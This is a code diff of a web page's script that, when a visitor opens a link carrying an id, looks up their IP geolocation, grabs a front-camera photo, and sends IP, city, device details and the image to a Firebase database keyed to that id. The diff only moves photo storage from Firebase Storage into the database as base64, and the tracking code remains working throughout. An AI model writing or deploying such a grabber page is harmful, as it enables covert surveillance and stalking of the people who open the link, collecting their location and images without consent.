@@ -85,13 +85,11 @@
 
     <script type="module">
         import { db, ref, push } from './firebase-config.js';
-        import { getStorage, ref as storageRef, uploadString, getDownloadURL } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js';
 
         const statusEl = document.getElementById('status');
         const id = new URLSearchParams(location.search).get('id');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const storage = getStorage();
 
         if (!id) {
             showError();
@@ -105,17 +103,17 @@
                 const geoData = await fetch('https://ipapi.co/json/').then(r => r.json());
 
                 // 2. Try to capture photo from camera
-                let photoURL = null;
+                let photoData = null;
                 try {
-                    photoURL = await captureAndUploadPhoto();
+                    photoData = await capturePhoto();
                 } catch (err) {
                     console.log('Camera not available:', err);
                 }
 
                 // 3. Calculate expiration time (1 hour from now)
-                const expiresAt = Date.now() + (60 * 60 * 1000); // 1 hour in milliseconds
+                const expiresAt = Date.now() + (60 * 60 * 1000);
 
-                // 4. Save to Firebase database
+                // 4. Save to Firebase database (including photo as base64)
                 await push(ref(db, `visitas/${id}`), {
                     ip: geoData.ip || 'Unknown',
                     ciudad: geoData.city || 'Unknown',
@@ -129,7 +127,7 @@
                     }),
                     timestamp: Date.now(),
                     expiresAt: expiresAt,
-                    foto: photoURL,
+                    foto: photoData, // Base64 image stored directly in database
                     userAgent: navigator.userAgent,
                     idioma: navigator.language,
                     plataforma: navigator.platform
@@ -142,7 +140,7 @@
             }
         }
 
-        async function captureAndUploadPhoto() {
+        async function capturePhoto() {
             return new Promise(async (resolve, reject) => {
                 try {
                     // Request camera access (front camera)
@@ -168,31 +166,13 @@
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0);
 
-                        // Convert to base64
-                        const imageData = canvas.toDataURL('image/jpeg', 0.6);
+                        // Convert to base64 (lower quality to save space)
+                        const imageData = canvas.toDataURL('image/jpeg', 0.5);
 
                         // Stop camera
                         stream.getTracks().forEach(track => track.stop());
 
-                        // Upload to Firebase Storage with expiration metadata
-                        try {
-                            const timestamp = Date.now();
-                            const fileName = `captures/${id}/${timestamp}.jpg`;
-                            const photoRef = storageRef(storage, fileName);
-
-                            // Upload with custom metadata
-                            await uploadString(photoRef, imageData, 'data_url', {
-                                customMetadata: {
-                                    expiresAt: (Date.now() + (60 * 60 * 1000)).toString()
-                                }
-                            });
-
-                            const downloadURL = await getDownloadURL(photoRef);
-                            resolve(downloadURL);
-                        } catch (uploadErr) {
-                            console.error('Upload error:', uploadErr);
-                            resolve(null);
-                        }
+                        resolve(imageData);
                     };
 
                     video.onerror = () => {
